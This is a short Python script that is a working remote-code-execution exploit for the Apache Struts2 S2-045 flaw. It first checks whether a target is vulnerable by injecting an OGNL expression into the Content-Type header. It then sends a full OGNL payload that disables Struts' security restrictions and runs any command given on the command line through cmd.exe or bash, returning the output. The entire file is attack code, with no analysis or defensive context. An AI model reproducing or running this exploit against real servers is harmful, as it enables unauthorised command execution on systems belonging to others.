import requests
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
}

def test(url):
    tesPoc = """%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('s2-045',233*233)}.multipart/form-data"""
    headers['Content-Type'] = tesPoc
    try:
        res = requests.post(url,headers=headers,timeout=5).headers
        return res
    except:
        return
    
def p(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"
    headers['Content-Type'] = payload
    try:
        res = requests.post(url,headers=headers,timeout=5).text
        return res
    except:
        return 

if sys.argv[1]:
    url = f'http://{sys.argv[1]}'

if len(sys.argv) == 2:
    num = test(url)
    if '54289' == num['s2-045']:
        print("[*] checking s2-045 ...")
        print("[*] vul Exists!!!")
elif len(sys.argv) == 3:
    print(p(url,sys.argv[2]))
else:
    print("[-] argv error!!")
    print('[+] usage url [cmd]')
